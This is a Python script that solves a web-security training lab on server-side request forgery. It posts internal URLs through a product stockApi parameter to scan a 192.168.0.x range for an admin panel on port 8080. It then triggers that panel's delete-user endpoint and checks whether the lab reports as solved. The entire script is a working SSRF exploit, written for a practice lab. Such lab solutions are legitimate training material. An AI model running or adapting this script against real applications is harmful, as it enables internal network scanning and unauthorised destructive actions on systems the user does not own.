import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: Basic SSRF against another back-end system')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

for i in range(256):
    r = requests.post("https://" + lab.id + ".web-security-academy.net/product/stock", data={'stockApi':f'http://192.168.0.{i}:8080/admin'})
    if r.status_code == 200:
        octet = i
        print(f'Internal admin panel found: http://192.168.0.{octet}:8080/admin')
        break
try:
    requests.post("https://" + lab.id + ".web-security-academy.net/product/stock", data={'stockApi':f'http://192.168.0.{octet}:8080/admin/delete?username=carlos'})
except:
    pass

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")